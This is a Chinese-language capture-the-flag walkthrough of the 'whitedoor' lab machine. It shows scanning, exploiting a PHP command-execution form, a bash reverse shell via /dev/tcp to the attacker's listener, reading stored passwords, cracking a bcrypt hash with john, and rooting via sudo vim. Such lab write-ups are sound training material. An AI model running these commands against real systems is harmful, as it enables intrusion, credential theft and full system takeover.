# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 00:23 EDT
Nmap scan report for whitedoor (192.168.2.2)
Host is up (0.00052s latency).
MAC Address: 08:00:27:33:D0:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 3.00 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 00:25 EDT
Nmap scan report for whitedoor (192.168.2.2)
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Home
MAC Address: 08:00:27:33:D0:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms whitedoor (192.168.2.2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
```

# 漏洞利用

在21端口下找到了一个文件

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.2  
Connected to 192.168.2.2.
220 (vsFTPd 3.0.3)
Name (192.168.2.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||58269|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        110          4096 Nov 16  2023 .
drwxr-xr-x    2 0        110          4096 Nov 16  2023 ..
-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||43726|)
150 Opening BINARY mode data connection for README.txt (13 bytes).
100% |************************|    13       31.65 KiB/s    00:00 ETA
226 Transfer complete.
13 bytes received in 00:00 (15.75 KiB/s)
ftp> exit
221 Goodbye.
┌──(kali㉿kali)-[~]
└─$ cat README.txt 
¡Good luck!
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.2 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 416]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

index.php存在post表单，提交到自身，可能存在命令执行

```
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.2.2/index.php                         
*   Trying 192.168.2.2:80...
* Connected to 192.168.2.2 (192.168.2.2) port 80
* using HTTP/1.x
> GET /index.php HTTP/1.1
> Host: 192.168.2.2
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 09 Apr 2026 04:40:05 GMT
< Server: Apache/2.4.57 (Debian)
< Vary: Accept-Encoding
< Content-Length: 416
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Home</title>
</head>
<body>
    <h1></h1>

    <!-- Formulario de Comandos -->
    <form action="index.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    </body>
</html>
* Connection #0 to host 192.168.2.2 left intact
```

尝试一下命令执行

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.2/index.php -d "entrada=id&submit=Send"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Home</title>
</head>
<body>
    <h1></h1>

    <!-- Formulario de Comandos -->
    <form action="index.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    <p>Permission denied. Only the 'ls' command is allowed.</p></body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.2/index.php -d "entrada=ls -la&submit=Send"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Home</title>
</head>
<body>
    <h1></h1>

    <!-- Formulario de Comandos -->
    <form action="index.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    <h2></h2><table border='1'><tr><td><pre>ls -la</pre></td></tr></table><h2></h2><pre>total 92
drwxr-xr-x 2 root root  4096 Nov 16  2023 .
drwxr-xr-x 3 root root  4096 Nov 16  2023 ..
-rw-r--r-- 1 root root  4040 Nov 16  2023 blackdoor.webp
-rw-r--r-- 1 root root  1405 Nov 16  2023 blackindex.php
-rw-r--r-- 1 root root  1174 Nov 16  2023 index.php
-rw-r--r-- 1 root root 72239 Nov 16  2023 whitedoor.jpg
</pre></body>
</html>
```

发现存在blackindex.php

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.2/blackindex.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <h1></h1>

    
    <img src="blackdoor.webp" alt="">

    <!-- Formulario de Comandos -->
    <form action="blackindex.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    </body>
</html>
```

blackindex.php同样拥有一个表单

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.2/blackindex.php -d "entrada=id&submit=Send"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <h1></h1>

    
    <img src="blackdoor.webp" alt="">

    <!-- Formulario de Comandos -->
    <form action="blackindex.php" method="post">
        <label for="entrada"></label>
        <textarea name="entrada" rows="4" cols="50" required></textarea>
        <br>
        <button type="submit" name="submit">Send</button>
    </form>

    <h2></h2><table border='1'><tr><td><pre>id</pre></td></tr></table><h2></h2><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></body>
</html>
```

尝试反弹一个shell回来

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.2.2/blackindex.php --data-urlencode "entrada=bash -c 'bash -i >& /dev/tcp/192.168.2.15/4444 0>&1'" --data-urlencode "submit=Send"
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.2] 49726
bash: cannot set terminal process group (465): Inappropriate ioctl for device
bash: no job control in this shell
www-data@whitedoor:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
www-data@whitedoor:/home/whiteshell/Desktop$ ls -la
ls -la
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16  2023 .my_secret_password.txt
www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt
cat .my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

登录到whiteshell用户:Th1sIsTh3P4sSwOrDblac5

```
┌──(kali㉿kali)-[~]
└─$ ssh whiteshell@192.168.2.2  
The authenticity of host '192.168.2.2 (192.168.2.2)' can't be established.
ED25519 key fingerprint is SHA256:zI6VeeIsxD3aPkTJng3eY1ZoPGGqaAdBAGU7E1nlHxI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.2' (ED25519) to the list of known hosts.
whiteshell@192.168.2.2's password: 
Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 17 18:08:29 2023 from 192.168.2.5
whiteshell@whitedoor:~$ id
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
whiteshell@whitedoor:~$ sudo -l
[sudo] password for whiteshell: 
Sorry, user whiteshell may not run sudo on whitedoor.
whiteshell@whitedoor:/home/Gonzalo/Desktop$ ls -la
total 16
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 root    root         61 Nov 16  2023 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16  2023 user.txt
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash 
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwertyuiop       (?)     
1g 0:00:00:01 DONE (2026-04-09 01:00) 0.7246g/s 260.8p/s 260.8c/s 260.8C/s adidas..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

登录到Gonzalo用户:qwertyuiop

```
whiteshell@whitedoor:/home/Gonzalo/Desktop$ su Gonzalo
Password: 
Gonzalo@whitedoor:~/Desktop$ id
uid=1002(Gonzalo) gid=1002(Gonzalo) groups=1002(Gonzalo)
Gonzalo@whitedoor:~/Desktop$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
Gonzalo@whitedoor:~/Desktop$ sudo vim -c ':!/bin/bash'

root@whitedoor:/home/Gonzalo/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```
